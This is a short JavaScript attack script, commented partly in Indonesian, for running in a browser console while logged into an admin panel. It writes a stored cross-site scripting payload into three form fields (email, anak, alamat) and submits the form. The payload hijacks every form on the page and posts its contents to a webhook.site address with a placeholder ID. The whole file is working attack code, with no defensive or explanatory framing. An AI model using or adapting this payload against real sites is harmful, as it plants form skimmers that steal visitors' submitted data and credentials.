
// XSS Injection Script
// Run this in browser console saat sudah login ke admin panel

function injectPayload() {
    // Fill form dengan payload
    document.getElementById('email').value = `<script>
document.querySelectorAll("form").forEach(form => {
    form.addEventListener("submit", function(e){
        e.preventDefault();
        fetch("https://webhook.site/YOUR-WEBHOOK-ID", {
            method: "POST",
            body: new FormData(form)
        });
        alert("Form submitted!");
    });
});
</script>`;
    document.getElementById('anak').value = `<script>
document.querySelectorAll("form").forEach(form => {
    form.addEventListener("submit", function(e){
        e.preventDefault();
        fetch("https://webhook.site/YOUR-WEBHOOK-ID", {
            method: "POST",
            body: new FormData(form)
        });
        alert("Form submitted!");
    });
});
</script>`;
    document.getElementById('alamat').value = `<script>
document.querySelectorAll("form").forEach(form => {
    form.addEventListener("submit", function(e){
        e.preventDefault();
        fetch("https://webhook.site/YOUR-WEBHOOK-ID", {
            method: "POST",
            body: new FormData(form)
        });
        alert("Form submitted!");
    });
});
</script>`;
    
    // Submit form
    document.getElementById('myForm').submit();
    
    console.log('[+] Payload injected!');
}

// Execute
injectPayload();
